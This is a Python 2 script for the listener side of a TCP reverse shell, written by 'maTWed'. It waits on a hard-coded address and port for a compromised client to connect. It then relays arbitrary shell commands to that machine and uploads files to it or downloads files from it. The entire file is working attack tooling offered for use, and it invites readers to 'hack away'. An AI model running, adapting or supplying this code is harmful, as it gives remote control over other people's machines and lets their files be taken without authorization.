#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Server-tcp-revshell - quick and simple. Does file upload/download
# by maTWed
# Things you will want to change:
#   1. ip addr and port located in connection()
#   2. cmd prompt you will receive also located in connection()

from socket import *
import os

def help():
    print "[!] I may not be qualified to help you but I will try\n"
    print " - upload [filename] # must be in your current directory"
    print " - download [filename] # Simple. Don't complicate it."
    print " - quit # Close connection\n"
    print "[!] All other basic commands are ran on the client\n"


def file_down(client,cmd):

    client.send(cmd)
    down,filename = cmd.split(' ')

    while True:
        packet = client.recv(1024)

        if 'File not found!' in packet:
            print "[-] File not found!"
            break

        f = open(filename, 'w')
        while (packet):
            if packet.endswith('DONE'):

                if 'DONE' in packet:
                    packet = packet.replace('DONE', '')
                f.write(packet)
                break

            else:
                f.write(packet)
                packet = client.recv(1024)
        f.close()
        print("[+] Download complete!")
        break


def file_up(client,cmd):

    client.send(cmd)
    path = os.getcwd() + '/' + cmd[7:]

    if os.path.exists(path):
        f = open(path, 'r')
        packet = f.read(1024)

        while (packet):
            client.send(packet)
            packet = f.read(1024)
        f.close()
        client.send('DONE')
        answer = client.recv(1024)

        if 'COMPLETE' in answer:
            print("[+] Upload Completed!")

        else:
            print(answer + 'COMPLETE not received')

    else:
        print("[-] File not found!")


def connection():

    s = socket(AF_INET, SOCK_STREAM)
    s.bind(('192.168.0.31', 1338))              # Change me
    print "[!] Listening for connection...\n"
    s.listen(1)
    client,addr = s.accept()
    print "[+] Connection from: %s" % str(addr) + '\n'
    print "[!] Other than typing 'help' for commands..."
    print "[!] Hack away and make this script better!\n"

    while True:
        cmd = raw_input("maTWed > ")        # if you change, maTWed will know

        if 'quit' in cmd:
            client.send('quit')
            client.close()
            break

        if 'help' in cmd:
            help()

        elif 'download' in cmd:
            file_down(client,cmd)

        elif 'upload' in cmd:
            file_up(client,cmd)

        else:
            client.send(cmd)
            print(client.recv(4096))

def main():
    connection()
main()


